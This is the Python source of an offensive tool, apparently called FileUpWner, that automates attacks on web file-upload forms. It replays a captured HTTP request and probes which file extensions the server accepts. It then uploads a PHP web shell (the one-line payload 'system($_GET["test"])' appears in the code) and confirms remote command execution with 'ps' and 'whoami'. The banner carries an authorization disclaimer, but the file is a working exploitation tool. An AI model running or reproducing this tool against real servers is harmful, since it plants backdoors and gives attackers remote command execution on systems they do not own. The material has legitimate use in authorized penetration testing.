import argparse
import random
from socket import timeout
import string
import base64
import xml.etree.ElementTree as ET
import sys
import termcolor
import warnings
import os
import re
import time
import requests
import importlib
from requests.exceptions import SSLError
import json
import config
from argparse import RawTextHelpFormatter

#TODO
#   Parse shell upload dir from response for dynamic names
#   Add custom injection markers
#   Catch request exceptions
#   htaccess module
#   .COM payload
#   Add --level
#   SVG XXE module
#   Code injection module

# Set of colors
red = '\u001b[31;1m'
orange = '\u001b[38;5;208m'
reset = '\033[0m'
yellow = '\u001b[33;1m'
blue = '\u001b[34;1m'
light_blue = '\033[34;1m'
green = '\033[1;32m'
white = '\u001b[37;1m'
dark_grey = '\033[90m'
red_italic = '\x1b[31;3;1m'

parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter)

parser.add_argument('-r', "--request-file", dest="request_file", default=False, help=f"{red}Required{reset} - Read from a HTTP/S request file (replace the file content with the string *content* and filename extension with the string *filename*)")
parser.add_argument('-t', "--true-regex", type=str, dest="true_regex", default=False,help=f"{red}Required{reset} - Provide the success message when a file is uploaded\n{reset}Usage: {blue}-s /--success {reset}{red_italic}'File uploaded successfully.'{reset}")
parser.add_argument('-f', "--false-regex", type=str, dest="false_regex", default=False,help=f"{red}Required{reset} - Provide a failure message when a file is uploaded\n{reset}Usage: {blue}-f /--failure {reset}{red_italic}'File is not allowed!'{reset}")
#parser.add_argument('-e', "--extension", type=str, dest="file_extension", default="not_selected", help=f"{red}Required {reset}- Provide server backend extension\n{reset}Usage: {blue}-e / --extension {reset}{red_italic}php (Supported extensions: php,asp,jsp,perl,coldfusion){reset}")
parser.add_argument('-a', "--accepted-extensions", type=str, dest="accepted_extensions", default=False, help=f"Provide allowed extensions to be uploaded, skips the in-built check\n{reset}Usage: {blue}-a /--accepted-extensions jpeg,png,zip'{reset}")
parser.add_argument('-d', "--upload-dir", type=str, dest="upload_dir", default=False, help=f'Provide a remote path where the WebShell will be uploaded (won\'t work if the file will be uploaded with a UUID).\n{reset}Usage: {blue}-l / --location {reset}{red_italic}/uploads/{reset}')
#parser.add_argument('-o', "--output", type=str, dest="output_location",help=f'Output directory (not file) to save the results in - Default is the current directory.\n{reset}Usage: {blue}-o / --output {reset}{red_italic}~/Desktop/example.com/{reset}',default=False)
parser.add_argument("--rate-limit", type=float, dest="rate_limit", default=0.1,help=f'Set rate-limiting with seconds between each request.\nUsage: {blue}--rate-limit {reset}')
#parser.add_argument("--proxy", type=str, dest="proxy_num", default="optional",help=f"Channel the HTTP requests via proxy client (i.e Burp Suite).\nUsage: {blue}-p / --proxy {reset}{red_italic}http://127.0.0.1:8080{reset}")
parser.add_argument('-v', "--verbose", type=int, dest="global_verbosity", default=0,help=f"If set, details about the test will be printed on the screen\nUsage:{blue} -v / --verbose{reset}")
parser.add_argument("--timeout", action="store_true", dest="timeout", default=20, help=f"Number of seconds the request will wait before timing out (Default: 20)\nUsage: {blue}--timeout{reset}")
parser.add_argument("--print-response", action="store_true", dest="print_response", default=False,help=f"If set, HTTP response will be printed on the screen\nUsage: {blue}--print-response{reset}")
parser.add_argument("--status-codes", type=str, dest="status_codes", default="200",help=f"HTTP status codes which will be treated as acceptable, default 200\nUsage: {blue}--status-code 200,301{reset}")
parser.add_argument("--protocol", type=str, dest="protocol", default="https",help=f"Connection protocol to be used for uploads, default https\nUsage: {blue}--status-code https{reset}")
parser.add_argument("--enable-redirects", action="store_true", dest="enable_redirects", default=False,help=f"If enabled, allows forms to redirect the requests\nUsage: {blue}--enable-redirects{reset}")
parser.add_argument("--manual-check", action="store_true", dest="manual_check", default=False,help=f"If enabled, pauses the execution after each successful shell upload\nUsage: {blue}--manual-check{reset}")
parser.add_argument("--disable-modules", type=str, dest="disable_modules", default=False,help=f"Disables specified modules\nUsage: {blue}--disable-modules " + ",".join(config.active_modules) + f"{reset}")

options = parser.parse_args()

if (not options.upload_dir.startswith("/")):
        options.upload_dir = "/" + options.upload_dir
if (not options.upload_dir.endswith("/")):
    options.upload_dir = options.upload_dir + "/" 




def error(message):
    print(f"{red}[!!!]{reset}  {message}")
    print("")
    exit(1)

def info(message, verbosity=None, spacing=True):
    global options
    if (verbosity != None):
        if (verbosity > options.global_verbosity):
            return

    if spacing: print()
    print(f"{light_blue}[i]{reset}  {message}")
    if spacing: print()

def warning(message):
    print(f"{orange}[!]{reset}  {message}")

def success(message):
    print(" " * 40, end='\r') 
    print(f"{yellow}[+]{reset}  {message}")

def failure(message, verbosity=None):
    global options
    if (verbosity != None):
        if (verbosity > options.global_verbosity):
            return
    print(f"{dark_grey}[-]{reset}  {message}")

def debug(message, verbosity=None):
    global options
    if (verbosity != None):
        if (verbosity > options.global_verbosity):
            return

    print("[?] ", end="")
    print(message)

def exit_success(url):
    print()
    print(f"Your shell is available at {url}")
    print(f"You can interract with it using the 'test' parameter: {url}?test=whoami")
    print()
    print()
    exit(1)

def banner():
    print()
    print("███████╗██╗██╗     ███████╗██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ ")
    print("██╔════╝██║██║     ██╔════╝██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗")
    print("█████╗  ██║██║     █████╗  ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝")
    print("██╔══╝  ██║██║     ██╔══╝  ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗")
    print("██║     ██║███████╗███████╗██║     ╚███╔███╔╝██║ ╚████║███████╗██║  ██║")
    print("╚═╝     ╚═╝╚══════╝╚══════╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝")
    print()
    print("v1.1")
    print()
    info("Disclaimer: The use of this tool and techniques should only be performed with proper authorization and consent from the targeted systems or networks. Unauthorized use can lead to legal consequences. It is the responsibility of the user to ensure that the tool is used for its intended purpose and not for any malicious or illegal activities.")
    print()     
    print("-----------------------------------------------------------------------")     
    print()      

def draw_progress_bar(current, max, bar_length=30):
    progress = current / max
    block = int(round(bar_length * progress))
    progress_bar = f"[{'=' * block}{' ' * (bar_length - block)}] (" + str(current) + "/" + str(max) + ")"
    if (progress < 1):
        print(progress_bar, end='\r') 
    else:
        print(progress_bar)                                          

def set_progress_bar(max):
    progress_bar = {
        "current": 0,
        "max": max
    }

    config.progress_bar = progress_bar

def show_progress_bar():
    config.progress_bar["current"] += 1
    draw_progress_bar(config.progress_bar["current"], config.progress_bar["max"])
    return 

def capitalise_random(string):
    characters = list(string)
    length = len(characters)
    index_to_capitalize = random.randint(0, length - 1)
    at_least_one_capitalized = False
    for i in range(length):
        if characters[i].isalpha():
            characters[i] = characters[i].upper() if i == index_to_capitalize or not at_least_one_capitalized else characters[i].lower()
            at_least_one_capitalized = True
    return ''.join(characters)



def GET(url):
    global options
    timeout_seconds = options.timeout

    response = requests.get(url, timeout=timeout_seconds)
    
    if (options.print_response): debug(response.status_code, 3)
    if (options.print_response): debug(response.status_code, 3)
    if (options.print_response): print(response.text)
    return response

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def parse_request_file(request_file):

    content = ""

    with open(request_file) as f:

        for line in f:
            content += line.rstrip() + '\n'

        # Split the request into headers and body

        headers_end_index = content.find('\n\n')

        if headers_end_index == -1:
            headers_end_index = content.find('\n\r\n')

        headers_content = content[:headers_end_index]

        # Extract the headers

        headers_list = re.findall(r'^(?P<name>[^:\r\n]+):\s*(?P<value>[^\r\n]*)', headers_content,

                                    flags=re.MULTILINE)

        headers_list = [{'key': key.strip(), 'value': value.strip()} for key, value in headers_list]

        headers = {item['key']: item['value'] for item in headers_list}
        # Split the request string by lines

        lines = content.split('\n')

        # Extract the host value

        host = [line.split(': ')[1] for line in lines if line.startswith('Host')][0]

        # Extract the path

        path = lines[0].split(' ')[1]

        url = f"http://{host}{path}"

    return content, headers, host, path

def test_accepted_formats(request_file, session, extensions_array):
    content, headers, host, path = parse_request_file(options.request_file)
    upload_url = f"http://{host}{options.upload_dir}"
    
    accepted_extensions = list()
    for extension in extensions_array:
        with open(f"assets/sample_files/sample.{extension}", 'rb') as file: file_data = file.read()
        file_name = generate_random_string(10) + f".{extension}"
        response, session, headers, url, file_name = upload(request_file, session, file_data, file_name, config.mimetypes[extension])
        if (check_success(response)):
            if (check_if_uploaded(file_name)):
                success(f"Filetype {extension} is accepted")
                accepted_extensions.append(extension)
            else:
                warning(f"Filetype {extension} is accepted, but not file not accessible")
        else:
            failure(f"Filetype {extension} is not accepted")

    return accepted_extensions

def check_success(response):
    global options

    if (response.status_code not in [int(x) for x in options.status_codes.split(",")]):
        debug(response.text)
        error(f"Response status code: {response.status_code}")

    if (options.true_regex != False):
        return bool(re.search(options.true_regex, response.text))

    if (options.false_regex != False):
        return not bool(re.search(options.false_regex, response.text))

def check_shell(url, more_info=False):
    response = GET(url + "?test=ps")
    if ("PID" in response.text and "TTY" in response.text):
        return True
    else: 
        if (more_info):
            if ('<?php system($_GET["test"]); ?>' in response.text):
                return "printed_out"
        return False

def check_if_uploaded(file_name):
    content, headers, host, path = parse_request_file(options.request_file)
    upload_url = f"http://{host}{options.upload_dir}"

    response = GET(upload_url + file_name)
    print(upload_url + file_name)

    if (response.status_code == 200):
        return True

    if (response.status_code != config.baseline_response.status_code):
        return True
    else:
        return False

def upload(request_file, session, file_data, file_name, file_content_type, timeout=20):
    global options

    time.sleep(options.rate_limit)
    decoded_data = file_data.decode('latin-1')

    with open(request_file, 'r') as file:
        file_contents = file.read()

        if config.filename_marker not in file_contents:
            error("Inject point *filename* not present in the request file")

        if config.content_marker not in file_contents:
            error("Inject point *content* not present in the request file")

    file_data_new = decoded_data

    content, headers, host, path = parse_request_file(request_file)
    content = content.replace(config.filename_marker, file_name)

    url = f"{config.protocol}://{host}{path}"

    try:
        if isinstance(content, list):
            content = ''.join(content)
            content = content.split('\r\n\r\n', 1)
            content = content[1]

        elif isinstance(content, dict):
            content = str(content)
            content = content.split('\r\n\r\n', 1)
            content = content[1]

        elif isinstance(content, str):
            content = content.split('\r\n\r\n', 1)
            content = content[1]

    except IndexError:
        content = ''.join(content)
        content = content.split('\n\n', 1)
        content = content[1]

    data = False
    if isinstance(file_data_new, bytes):
        file_data_new = file_data_new.decode('latin-1')

    content = content.replace(config.content_marker, file_data_new)

    # Extract attributes based on the content type
    if "multipart/form-data" in str(headers):

        data = str(content)

        pattern = re.compile(rf'filename="{file_name}".*?Content-Type: (.*?)(?=\n|$)', re.DOTALL)
        multipart_data = pattern.sub(f'filename="{file_name}" \nContent-Type: {file_content_type}', data)

        try:
            response = session.post(url, data=multipart_data, headers=headers,allow_redirects=options.enable_redirects, verify=True, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
        except SSLError:

            url_http = url.replace('https://', 'http://')  # Change protocol to http
            config.protocol = "http"

            warning(f"SSL error occurred. Switching to HTTP...")  
            response = session.post(url_http, data=multipart_data, headers=headers, allow_redirects=options.enable_redirects, verify=False, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
            
        if (response.status_code == 404):
            error(f"404 status on requested URL {url}")

        if (options.print_response): debug(response.status_code, 3)
        if (options.print_response): debug(response.status_code, 3)
        if (options.print_response): print(response.text)
        return response, session, headers, url, file_name
                
    else:
        error("Cannot parse request file")

def upload_and_validate(request_file, session, file_data, file_name, mimetype, message=None, expect_interaction=True, real_extension=None, return_on_upload=False):
    global options

    content, headers, host, path = parse_request_file(request_file)
    response, session, headers, url, file_name = upload(request_file, session, file_data, file_name, mimetype)
    if (real_extension != None): file_name = (file_name.split(".")[0]) + real_extension
    upload_url = f"{config.protocol}://{host}{options.upload_dir}"
    if (options.global_verbosity < 2 and message != None): show_progress_bar()
    if (check_success(response)):
        if return_on_upload: return session, True
        if expect_interaction and message != None: success(message + "\n")

        check_result = check_shell(upload_url + file_name, more_info=True)
        if (check_result == True):
            if not expect_interaction and message != None: success(message + "\n")
            success("Shell confirmed interactable")
            exit_success(upload_url + file_name)
        else:
            if (expect_interaction):
                debug((upload_url + file_name + "?test=whoami"), 0)
                if (check_result == "printed_out"):
                    extension = file_name.split(".")[-1]
                    if (extension in config.extensions["php"]):
                        del config.extensions["php"][config.extensions["php"].index(extension)]
                        warning(f"Shell was printed as plain text, removing .{extension} extension")
                    else:
                        warning("Shell was printed as plain text")
                else:
                    warning("Shell does not seem to be interractable, make sure your upload directory is correct")
                    if (options.manual_check):
                        input("Manual check enabled, waiting for input...")

    if (message != None): failure(message, 2)
    if return_on_upload: return session, False
    return session

def main():
    global options

    banner()

    if (options.request_file == False):
        error("Select a HTTP request file with -r / --request-file")
    
    if (options.true_regex == False and options.false_regex == False):
        error("You need to select a true or a false regex pattern")

    if (options.upload_dir == False):
        warning("Upload location not set, defaulting to '/'")

    if (options.disable_modules != False):
        disabled_modules = options.disable_modules.split(",")
        for module in disabled_modules:
            del config.active_modules[config.active_modules.index(module)]

    config.protocol = options.protocol
    session = requests.Session()
    content, headers, host, path = parse_request_file(options.request_file)
    upload_url = f"http://{host}{options.upload_dir}"

    #Get baseline 404 response
    config.baseline_response = GET(upload_url + generate_random_string(10) + "_nonexistent_file.zip")
    if (config.baseline_response.status_code == 200):
        warning("Non-existent paths respond with code 200, this might impact the results")

    if (options.accepted_extensions != False): 
        accepted_extensions = options.accepted_extensions.split(",")
    else:
        #Test for accepted formats
        info("Testing for accepted file types")
        print()
    
        accepted_extensions = test_accepted_formats(options.request_file, session, config.extensions["normal"])
        debug(accepted_extensions, 3)

        accepted_php_extensions = test_accepted_formats(options.request_file, session, config.extensions["php"])
        debug(accepted_extensions, 3) 

        if (len(accepted_extensions) < 1 and len(accepted_php_extensions) < 1):
            error("No accepted extensions found")

        if (True):
            for accepted_php_extension in accepted_php_extensions:
                info(f"Trying to upload .{accepted_php_extension} shell...")
                with open(config.shell_path, 'rb') as file: file_data = file.read()
                file_name = generate_random_string(10) + f".{accepted_php_extension}"
                session = upload_and_validate(options.request_file, session, file_data, file_name, "application/x-httpd-php")

                

    #Loop through modules
    print()
    info("Starting module execution")

    modules = importlib.import_module("modules")

    for module in config.active_modules:
        getattr(modules, module)(options.request_file, session, options, accepted_extensions)



if __name__ == "__main__":
    main()